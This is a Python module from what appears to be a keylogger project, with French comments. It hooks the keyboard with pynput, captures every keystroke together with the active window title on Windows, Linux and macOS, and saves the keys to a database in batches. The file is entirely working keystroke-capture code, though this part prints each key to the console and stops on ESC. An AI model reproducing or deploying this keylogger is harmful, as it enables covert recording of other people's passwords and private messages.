# ============================================================
#  core/listener.py — Hook clavier principal
#  Rôle : capturer chaque frappe et l'envoyer à storage/logger.py
# ============================================================

from pynput import keyboard
import threading
from datetime import datetime
import sys
import os

# On remonte d'un niveau pour accéder aux autres modules du projet
sys.path.append(os.path.join(os.path.dirname(__file__), ".."))

from storage.logger import log_key, init_db
from config import BUFFER_SIZE

# ── VARIABLES GLOBALES ───────────────────────────────────────
buffer         = []
last_timestamp = None
lock           = threading.Lock()


# ── DÉTECTION FENÊTRE ACTIVE ─────────────────────────────────
def get_active_window():
    """
    Retourne le nom de la fenêtre active selon l'OS.
    Retourne "unknown" si la récupération échoue.
    """
    try:
        if sys.platform == "win32":
            import pygetwindow as gw
            w = gw.getActiveWindow()
            return w.title if w else "unknown"

        elif sys.platform == "linux":
            import subprocess
            result = subprocess.check_output(
                ["xdotool", "getactivewindow", "getwindowname"],
                stderr=subprocess.DEVNULL
            )
            return result.decode("utf-8").strip() or "unknown"

        elif sys.platform == "darwin":
            from AppKit import NSWorkspace
            app = NSWorkspace.sharedWorkspace().frontmostApplication()
            return app.localizedName() or "unknown"

    except Exception:
        return "unknown"

    return "unknown"


# ── FORMAT TOUCHE ─────────────────────────────────────────────
def format_key(key):
    """
    Convertit l'objet pynput en chaîne lisible.
    Touche normale → 'a', Touche spéciale → '[enter]'
    """
    try:
        return key.char
    except AttributeError:
        return f"[{key.name}]"


# ── FLUSH BUFFER → DB ─────────────────────────────────────────
def flush_buffer(window="unknown"):
    """
    Vide le buffer en écrivant chaque frappe dans la DB.
    """
    if not buffer:
        return
    key_data = buffer.copy()
    for key_str in key_data:
        log_key(key_str, window=window)
    buffer.clear()


# ── CALLBACKS PYNPUT ─────────────────────────────────────────
def on_press(key):
    global last_timestamp

    timestamp = datetime.now().strftime("%H:%M:%S")
    key_str   = format_key(key)
    window    = get_active_window()

    if key_str is None:
        return

    with lock:
        buffer.append(key_str)
        last_timestamp = timestamp
        if len(buffer) >= BUFFER_SIZE:
            flush_buffer(window)

    print(f"[{timestamp}] {window} → {key_str}")


def on_release(key):
    if key == keyboard.Key.esc:
        print("\n[*] ESC — arrêt.")
        with lock:
            if buffer:
                flush_buffer()
        return False


# ── CLASSE KEYLOGGER ─────────────────────────────────────────
class KeyLogger:
    def __init__(self):
        self.listener   = None
        self.is_running = False

    def start(self):
        init_db()
        print("[*] Listener démarré — ESC pour stop")

        self.is_running = True
        self.listener = keyboard.Listener(
            on_press=on_press,
            on_release=on_release
        )
        self.listener.daemon = True
        self.listener.start()
        self.listener.join()
        self.is_running = False

    def stop(self):
        if self.listener and self.is_running:
            self.listener.stop()


if __name__ == "__main__":
    kl = KeyLogger()
    kl.start()